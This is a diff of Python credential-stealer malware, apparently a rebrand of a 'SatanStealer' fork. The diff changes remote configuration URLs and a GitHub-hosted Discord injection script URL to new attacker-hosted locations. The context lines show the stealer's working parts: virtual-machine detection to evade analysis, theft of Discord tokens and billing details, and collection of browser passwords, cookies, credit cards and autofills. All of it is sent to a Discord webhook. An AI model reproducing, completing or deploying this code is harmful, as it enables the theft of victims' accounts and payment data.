@@ -1,3 +1,4 @@
+
 import os
 import re
 import sys
@@ -101,15 +102,15 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('VM Detected')
 
-cname = "https://rentry.co/yvu4nqyu/raw"
+cname = "https://rentry.co/mosu4q8p/raw"
 cnameresp = requests.get(cname)
 cname = cnameresp.text
 
-smallcname = "https://rentry.co/uzgg9tsx/raw"
+smallcname = "https://rentry.co/dafgcxm9/raw"
 smallcnameresp = requests.get(smallcname)
 smallcname = smallcnameresp.text
 
-footerc = "https://rentry.co/tixt2v57/raw"
+footerc = "https://rentry.co/7foi6m3a/raw"
 footercresp = requests.get(footerc)
 footerc = footercresp.text
 
@@ -118,7 +119,7 @@ wordsresp = requests.get(words)
 words = wordsresp.text
 
 h00k = "YOUR_WEBHOOK_URL"
-inj3c710n_url = f"https://raw.githubusercontent.com/HatGirl-zz/SatanStealerV2/main/injection.js"
+inj3c710n_url = f"https://raw.githubusercontent.com/versayy/Dusk-Stealer/main/injection.js"
 
 class DATA_BLOB(Structure):
     _fields_ = [
@@ -454,7 +455,7 @@ def UP104D70K3N(token, path):
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
     billing = G3781111N6(token)
     badge = G3784D63(flags)
     friends = Tr1M(G37UHQFr13ND5(token))
@@ -526,7 +527,7 @@ def UP104D70K3N(token, path):
                 },
             "footer": {
                 "text": f"{footerc}",
-                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                "icon_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
@@ -534,7 +535,7 @@ def UP104D70K3N(token, path):
             }
         ],
         "username": f"{cname} | t.me/{smallcname}r",
-        "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&",
         "attachments": []
         }
     urlopen(Request(hook, data=dumps(data).encode(), headers=headers))    
@@ -563,12 +564,12 @@ def UP104D(name, link):
                 "fields": link,
                 "footer": {
                     "text": f"{footerc}",
-                    "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                    "icon_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
                 },
                 }
             ],
             "username": f"{cname} | t.me/{smallcname}r",
-            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&",
             "attachments": []
             }
         urlopen(Request(hook, data=dumps(data).encode(), headers=headers))    
@@ -596,12 +597,12 @@ def UP104D(name, link):
                 "title": f"{cname} | File {words}",
                 "footer": {
                     "text": f"{footerc}",
-                    "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                    "icon_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
                 }
                 }
             ],
             "username": f"{cname} | t.me/{smallcname}r",
-            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&",
             "attachments": []
             }
         urlopen(Request(hook, data=dumps(data).encode(), headers=headers))    
@@ -826,25 +827,25 @@ def G378r0W53r5(br0W53rP47H5):
                 "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n<:blackarrow:1095740975197995041> • [{cname}Passwords.txt]({filess[0]})",
                 "color": 2895667,
                 "footer": {"text": f"{footerc}",  
-                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"}
+                "icon_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"}
             },
             {
                 "title": f"{cname} | Cookies {words}",
                 "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n<:blackarrow:1095740975197995041> • [{cname}Cookies.txt]({filess[1]})",
                 "color": 2895667,
                 "footer": {"text": f"{footerc}",  
-                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"}
+                "icon_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"}
             },
             {
                 "title": f"{cname} | Browser Data",
                 "description": f"<:srcr_newspaper:1187579795056373782> • **{H1570rYC0UNt}** Histories Found\n<:blackarrow:1095740975197995041> • [{cname}Histories.txt]({filess[4]})\n\n<:lol_role_fill:1187747599286018149> • **{AU70F111C0UNt}** Autofills Found\n<:blackarrow:1095740975197995041> • [{cname}Autofills.txt]({filess[3]})\n\n<:1SW_CreditCard:1187580159495245876> • **{CC5C0UNt}** Credit Cards Found\n<:blackarrow:1095740975197995041> • [{cname}CreditCards.txt]({filess[2]})\n\n<:black_book:1187577552739508286> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:blackarrow:1095740975197995041> • [{cname}Bookmarks.txt]({filess[5]})",
                 "color": 2895667,
                 "footer": {"text": f"{footerc}",  
-                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"}
+                "icon_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"}
             }
         ],
         "username": f"{cname} | t.me/{smallcname}r",
-        "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&",
         "attachments": []
     }
     urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -918,12 +919,12 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "color": 2895667,
             "footer": {
                 "text": f"{footerc}",
-                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                "icon_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
             }
             }
         ],
         "username": f"{cname} | t.me/{smallcname}r",
-        "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&",
         "attachments": []
     }
     
